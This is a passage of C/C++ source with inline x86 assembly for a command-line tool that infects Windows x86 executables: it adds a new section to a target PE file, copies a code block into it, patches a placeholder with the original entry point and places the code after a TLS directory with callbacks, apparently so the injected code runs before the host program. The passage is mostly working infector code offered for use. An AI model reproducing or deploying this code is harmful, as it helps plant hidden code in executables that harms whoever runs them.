	popad
	nop
	nop
	mov eax, 0x1ee7c0d3
    jmp eax      
	}

	__asm {
	over:
	mov eax, loc2
	mov[end], eax
	loc2 :
	}

	byte code[5000];
	byte *fb = ((byte *)(start));
	DWORD *falseEP;
	DWORD i = 0;
	
	while (i < ((end - 11) - start)) {
		falseEP = ((DWORD*)((byte*)start + i));
		if (*falseEP == 0x1ee7c0d3) {
			DWORD old;
			VirtualProtect((LPVOID)falseEP, 4, PAGE_EXECUTE_READWRITE, &old);
			*falseEP = OEP;

		}
		code[i] = fb[i];
		i++;
	}
	
	//write all the code in new section but after (4 (null bytes) + 24(size of tls directory) + 8 (two addresses of callbacks) + 4 (nullbytes) = 40
	SetFilePointer(file, last->PointerToRawData + 40, NULL, FILE_BEGIN);   
	WriteFile(file, code, i, &dw, 0);
	CloseHandle(file);
	return true;
}

int main(int argc, char **argv)
{
	if (argc != 3) {
		printf(
			"Usage: %s <target file> <section name>\n\n", argv[0]);
		return 0;
	}
	char *file = argv[1];
	char *name = argv[2];
	int res = AddSection(file, name, 10000);
	
	switch (res) {
	case 0:
		printf("Error adding section: File not found or in use!\n");
		break;
	case 1:
		printf("Section added!\n");
		if (AddCode(file))
			printf("Code written!\n");
		else
			printf("Error writting code!\n");
		break;
	case -1:
		printf("Error adding section: Invalid path or PE format!\n");
		break;
	case -2:
		printf("Error adding section: Section already exists!\n");
		break;
	case -3:
		printf("Error: x64 PE detected! This version works only with x86 PE's!\n");
		break;
	}
	system("pause");
}



